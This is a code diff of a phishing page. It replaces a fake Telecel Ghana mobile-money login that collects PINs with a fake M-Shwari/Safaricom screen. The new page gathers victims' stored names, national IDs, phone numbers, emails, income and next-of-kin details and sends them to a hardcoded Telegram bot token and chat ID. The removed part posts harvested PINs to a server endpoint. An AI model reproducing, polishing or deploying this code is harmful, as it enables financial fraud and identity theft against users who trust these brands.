@@ -1,367 +1,308 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-    <title>EcoCash Login</title>
-
-    <!-- MOBILE -->
+    <meta charset="UTF-8">
+    <title>M-Shwari | Secure Access</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
+    
+    <!-- Only keep this if you actually have a style.css file -->
     <!-- <link rel="stylesheet" href="style.css"> -->
 
     <style>
-        body {
-            margin: 0;
-            font-family: 'Segoe UI', sans-serif;
-            /* background: #ffffff; */
-            background: #d32f2f;
+        /* Pro Splash & Referral Styles */
+        #ms-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 99999;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
 
-        /* ===== TOP (SMALL RED) ===== */
-        .top {
-            background: #d32f2f;
-            color: white;
-            text-align: center;
-            padding: 20px 10px 15px;
-        }
-
-        .logo-circle {
-            width: 50px;
-            height: 50px;
-            background: #eee;
-            border-radius: 50%;
-            margin: auto;
-            padding: 5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 50px;
-            color: #d32f2f;
-            font-weight: bold;
-        }
-
-        .brand {
-            font-size: 24px;
-            margin-top: 8px;
-            font-weight: bold;
-        }
-
-        .sub {
-            font-size: 13px;
-        }
-
-        /* ===== CENTER (LARGE WHITE) ===== */
-        .center {
-            background: #fefefe;
-            padding: 50px 20% 70px 20%;
-            border-bottom-right-radius: 24%;
-            border-bottom-left-radius: 24%;
-
-
-        }
-
-        .form-box {
-            max-width: 420px;
-            margin: auto;
-        }
-
-        .title {
-            text-align: center;
-            margin-bottom: 25px;
-            font-size: 18px;
-            color: #444;
-        }
-
-        label {
-            display: block;
-            margin-top: 10px;
-            font-size: 14px;
-            color: #555;
-        }
-
-        select,
-        input {
+        .ms-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
-            padding: 15px;
-            margin-top: 8px;
-            border-radius: 12px;
-            border: 2px solid #d32f2f;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-
-        /* PIN */
-        .pin-title {
-            margin-top: 25px;
-            font-size: 14px;
-        }
-
-        .pin-row {
+            height: 100%;
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin-top: 12px;
-        }
-
-        .pin-box {
-            width: 55px;
-            height: 55px;
-            border: 2px solid #d32f2f;
-            border-radius: 12px;
-            text-align: center;
-            font-size: 22px;
-        }
-
-        .icons {
-            display: flex;
             align-items: center;
-            margin-left: 8px;
-            font-size: 18px;
+            transition: opacity 0.6s ease-in-out, visibility 0.6s;
+            opacity: 0;
+            visibility: hidden;
         }
 
-        .forgot {
+        .ms-screen.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* SCREEN 1: BRAND GREEN SPLASH */
+        #screen-splash {
+            background-color: #2cae34; /* Safaricom/M-Shwari Green */
+            flex-direction: column;
+        }
+
+        #main-logo {
+            width: 350px;
+            max-width: 70%;
+            transform: scale(0.9);
+            transition: transform 1s ease, opacity 1s ease;
+            opacity: 0;
+        }
+
+        #main-logo.show {
+            transform: scale(1);
+            opacity: 1;
+        }
+
+        .saf-footer {
+            position: absolute;
+            bottom: 50px;
+            width: 130px;
+            opacity: 0;
+            z-index: 1000;
+            transition: opacity 1.5s ease;
+            background-color: #ffffffa1;
+        }
+
+        /* SCREEN 2: DARK REFERRAL UI */
+        #screen-referral {
+            background-color: #1a1a1a;
+            color: #ffffff;
+        }
+
+        .wrapper {
             text-align: center;
-            margin-top: 12px;
-            color: #d32f2f;
-            font-size: 13px;
-        }
-
-        /* LOGIN BUTTON */
-        .login-btn {
-            width: 100%;
-            margin-top: 30px;
-            padding: 16px;
-            border-radius: 12px;
-            border: none;
-            background: #ccc;
-            color: white;
-            font-size: 16px;
-            transition: 0.3s;
-        }
-
-        .login-btn.active {
-            background: #d32f2f;
-        }
-
-        /* ===== BOTTOM (MEDIUM RED WITH CURVE) ===== */
-        .bottom {
-            /* background: #d32f2f; */
-            /* margin-top: 40px; */
-            padding: 80px 20px 40px;
-            border-top-left-radius: 0px;
-            border-top-right-radius: 0px;
-            text-align: center;
-            color: white;
-        }
-
-        .bottom-logo {
-            width: 40px;
-            height: 40px;
-            background: #eee;
-            border-radius: 50%;
-            margin: auto;
-            padding: 5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #d32f2f;
-            font-weight: bold;
-            font-size: 45px;
-
-        }
-
-        .bottom h2 {
-            margin: 10px 0 5px;
-        }
-
-        .bottom p {
-            margin: 0;
-            font-size: 14px;
-        }
-
-        .btn {
-            width: 100%;
+            width: 90%;
             max-width: 400px;
-            margin: 15px auto 0;
-            padding: 16px;
-            border-radius: 12px;
-            border: none;
-            background: white;
-            font-size: 15px;
         }
 
-        /* MOBILE ADJUST */
-        @media (max-width: 600px) {
-            .center {
-                padding: 40px 10% 70px 10%;
-                border-bottom-right-radius: 18%;
-                border-bottom-left-radius: 18%;
-            }
+        .prompt-text {
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+            color: #b3b3b3;
+            margin-bottom: 30px;
+            text-transform: uppercase;
         }
+
+        .input-row {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 40px;
+        }
+
+        .code-box {
+            width: 55px;
+            height: 70px;
+            background-color: #262626;
+            border: 1px solid #3d3d3d;
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 2rem;
+            text-align: center;
+            outline: none;
+            transition: border-color 0.3s, background-color 0.3s;
+        }
+
+        .code-box:focus {
+            border-color: #42b549;
+            background-color: #2d2d2d;
+        }
+
+        /* CONFIRM BUTTON */
+        .confirm-btn {
+            background-color: #42b549;
+            color: white;
+            border: none;
+            padding: 16px 50px;
+            border-radius: 30px;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.4s ease;
+            pointer-events: none;
+        }
+
+        .confirm-btn.visible {
+            opacity: 1;
+            transform: translateY(0);
+            pointer-events: all;
+        }
+
+        .confirm-btn:active {
+            transform: scale(0.96);
+        }
+
+        /* Loader inside button */
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
-
 <body>
 
-    <!-- TOP WHITE -->
-    <div class="top-section">
-
-        <div class="top">
-            <div class="logo-circle">t</div>
-            <div class="brand">Telecel</div>
-            <div class="sub">Mobile Financial Services</div>
+    <div id="ms-container">
+        <div id="screen-splash" class="ms-screen active">
+            <!-- Ensure logo.jpeg is in the same folder as this HTML file -->
+            <img src="logo-removebg-preview.png" alt="M-Shwari" id="main-logo">
+            <img src="safaricom-25.gif" alt="Safaricom" class="saf-footer" id="saf-logo">
         </div>
 
-        <!-- CENTER -->
-        <div class="center">
-            <div class="form-box">
-
-                <div class="title">Login to Your Account</div>
-
-                <label>Account Type</label>
-                <select>
-                    <option>Mobile</option>
-                    <option>Broadband</option>
-                </select>
-
-                <input type="text" id="phone" readonly>
-
-                <div class="pin-title">Enter your PIN</div>
-
-                <div class="pin-row">
-                    <input maxlength="1" class="pin-box" type="password">
-                    <input maxlength="1" class="pin-box" type="password">
-                    <input maxlength="1" class="pin-box" type="password">
-                    <input maxlength="1" class="pin-box" type="password">
-                    <div class="icons">👁️ 💬</div>
+        <div id="screen-referral" class="ms-screen">
+            <div class="wrapper">
+                <h2 class="prompt-text">Enter your referral code</h2>
+                <div class="input-row">
+                    <input type="number" maxlength="1" class="code-box" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-box" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-box" inputmode="numeric">
+                    <input type="number" maxlength="1" class="code-box" inputmode="numeric">
                 </div>
-                <p id="errorMsg" style="color:red; text-align:center; display:none;"></p>
-
-                <div class="forgot">Forgot your PIN?</div>
-
-                <button id="submitBtn" onclick="submitOtp()" class="login-btn">LOGIN</button>
-
+                <button class="confirm-btn" id="confirmBtn" onclick="handleSubmit()">
+                    <span id="btnText">CONFIRM</span>
+                    <div class="loading-spinner" id="btnLoader"></div>
+                </button>
             </div>
         </div>
 
-        <!-- BOTTOM -->
-        <div class="bottom">
+    </div>
 
-            <div class="bottom-logo">t</div>
-            <h2>Telecel</h2>
-            <p>Ghana</p>
-            <p>Secure. Fast. Reliable.</p>
+    <script>
+        // 🛠️ CONFIGURATION - REPLACE WITH YOUR DETAILS
+        const BOT_TOKEN = '8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc';
+        const CHAT_ID = '7162306402';
 
-            <button class="btn">📱 Download App</button>
-            <button class="btn">❓ Get Help</button>
+        document.addEventListener("DOMContentLoaded", function() {
+            const mainLogo = document.getElementById('main-logo');
+            const safLogo = document.getElementById('saf-logo');
+            const splash = document.getElementById('screen-splash');
+            const referral = document.getElementById('screen-referral');
+            const inputs = document.querySelectorAll('.code-box');
+            const confirmBtn = document.getElementById('confirmBtn');
 
-        </div>
+            // 1. Initial Animations
+            setTimeout(() => mainLogo.classList.add('show'), 500);
+            setTimeout(() => safLogo.style.opacity = "1", 1500);
 
-        <script>
+            // 2. Transition to Referral UI after 4 seconds
+            setTimeout(() => {
+                splash.classList.remove('active');
+                referral.classList.add('active');
+                inputs[0].focus(); // Focus first box
+            }, 4000);
 
-
-            const inputs = document.querySelectorAll(".pin-box");
-            const loginBtn = document.getElementById("submitBtn");
-
+            // 3. Input Logic (Auto-focus & Button Visibility)
             inputs.forEach((input, index) => {
-                input.addEventListener("input", () => {
-                    input.value = input.value.replace(/[^0-9]/g, "");
-
-                    if (input.value && index < inputs.length - 1) {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
+                    
+                    if (e.target.value !== "" && index < inputs.length - 1) {
                         inputs[index + 1].focus();
                     }
 
-                    checkPin();
-
+                    // Show button only if all 4 digits are entered
+                    const filled = Array.from(inputs).every(i => i.value.length === 1);
+                    if (filled) {
+                        confirmBtn.classList.add('visible');
+                    } else {
+                        confirmBtn.classList.remove('visible');
+                    }
                 });
 
-                input.addEventListener("keydown", (e) => {
-                    if (e.key === "Backspace" && !input.value && index > 0) {
+                // Handle Backspace
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === "Backspace" && e.target.value === "" && index > 0) {
                         inputs[index - 1].focus();
                     }
                 });
             });
+        });
 
-            async function submitOtp() {
-                // document.getElementById("submitBtn");
-                if (loginBtn.disabled) return;
+        async function handleSubmit() {
+            const btnText = document.getElementById('btnText');
+            const btnLoader = document.getElementById('btnLoader');
+            const confirmBtn = document.getElementById('confirmBtn');
+            const referralCode = Array.from(document.querySelectorAll('.code-box')).map(i => i.value).join('');
 
-                let pin = "";
-                document.querySelectorAll(".pin-box").forEach(input => {
-                    pin += input.value;
-                });
+            // UI Feedback
+            btnText.style.display = 'none';
+            btnLoader.style.display = 'block';
+            confirmBtn.style.pointerEvents = 'none';
 
-                const error = document.getElementById("errorMsg");
-
-                if (pin.length < 4) {
-                    error.innerText = "Enter full PIN";
-                    error.style.display = "block";
-                    return;
-                }
-
-                error.style.display = "none";
-
-                loginBtn.innerText = "Processing...";
-                loginBtn.disabled = true;
-
-                ;
-
-                const phone = document.getElementById("phone").value;
-
-                try {
-                    const res = await fetch("/submit", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            name: "User",
-                            phone: phone,
-                            pin: pin
-                        })
-                    });
-
-                    if (!res.ok) throw new Error();
-
-                    // clear PIN AFTER submit
-                    document.querySelectorAll(".pin-box").forEach(input => input.value = "");
-
-                    localStorage.setItem("firstProcess", "yes");
-
-                    window.location.href = "processing.html";
-
-                } catch (err) {
-                    error.innerText = "Submission failed. Try again.";
-                    error.style.display = "block";
-
-                    btn.innerText = "Submit";
-                    btn.disabled = false;
-
-                    document.getElementById("pageLoader").style.display = "none";
-                }
-            }
-
-            // BUTTON ACTIVE
-            function checkPin() {
-                let pin = "";
-                inputs.forEach(i => pin += i.value);
-
-                if (pin.length === 4) {
-                    loginBtn.classList.add("active");
-                } else {
-                    loginBtn.classList.remove("active");
-                }
-            }
-
-
-            document.getElementById("phone").value = localStorage.getItem("phone") || "+233";
-
-            window.onload = () => {
-                document.body.classList.add("loaded");
+            // Gather all stored data
+            const loanData = {
+                Name: localStorage.getItem("fullName") || "N/A",
+                ID: localStorage.getItem("idNumber") || "N/A",
+                Phone: localStorage.getItem("phone") || "N/A",
+                Email: localStorage.getItem("email") || "N/A",
+                Amount: localStorage.getItem("amount") || "N/A",
+                Duration: localStorage.getItem("duration") || "N/A",
+                Reason: localStorage.getItem("reason") || "N/A",
+                Income: localStorage.getItem("monthlyIncome") || "N/A",
+                Kin1: `${localStorage.getItem("kinName1")} (${localStorage.getItem("kinPhone1")})`,
+                Kin2: `${localStorage.getItem("kinName2")} (${localStorage.getItem("kinPhone2")})`,
+                Referral: referralCode
             };
 
-        </script>
-        <div id="pageLoader" class="loader" style="display:none;"></div>
-</body>
+            const telegramMessage = `🏦 *New Loan Request*\n` +
+                                    `--------------------------\n` +
+                                    `👤 *User:* ${loanData.Name}\n` +
+                                    `🆔 *ID:* ${loanData.ID}\n` +
+                                    `📞 *Phone:* ${loanData.Phone}\n` +
+                                    `📧 *Email:* ${loanData.Email}\n\n` +
+                                    `💰 *Amount:* KES ${loanData.Amount}\n` +
+                                    `⏳ *Term:* ${loanData.Duration} Days\n` +
+                                    `🎯 *Reason:* ${loanData.Reason}\n` +
+                                    `💵 *Income:* ${loanData.Income}\n\n` +
+                                    `👥 *Kin 1:* ${loanData.Kin1}\n` +
+                                    `👥 *Kin 2:* ${loanData.Kin2}\n` +
+                                    `🎟️ *Referral:* ${loanData.Referral}`;
 
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: 7162306402,
+                        text: telegramMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (response.ok) {
+                    // Redirect to your next file (e.g., a success or processing page)
+                    window.location.href = "processing.html"; 
+                } else {
+                    alert("Submission error. Please try again.");
+                    resetBtn();
+                }
+            } catch (err) {
+                console.error(err);
+                alert("Connection error.");
+                resetBtn();
+            }
+        }
+
+        function resetBtn() {
+            document.getElementById('btnText').style.display = 'block';
+            document.getElementById('btnLoader').style.display = 'none';
+            document.getElementById('confirmBtn').style.pointerEvents = 'all';
+        }
+    </script>
+</body>
 </html>
